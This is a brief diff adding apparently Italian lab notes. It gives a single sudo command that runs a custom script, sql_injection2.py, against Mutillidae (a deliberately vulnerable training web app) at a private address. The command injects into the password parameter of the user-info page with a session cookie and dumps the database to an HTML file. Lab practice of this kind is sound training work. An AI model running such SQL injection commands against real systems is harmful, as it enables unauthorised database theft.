@@ -1,0 +1,4 @@
+#creare il file vuoto:  
+mutillidae_db.html
+#lanciare il comando :
+sudo python3 sql_injection2.py --host="192.168.58.140" -u='/mutillidae/index.php?page=user-info.php&username=&password=&user-info-php-submit-button=View+Account+Details' --param="password" --cookie="PHPSESSID=3e726056cf963b43bd87036e378d07b" > mutillidae_db.html
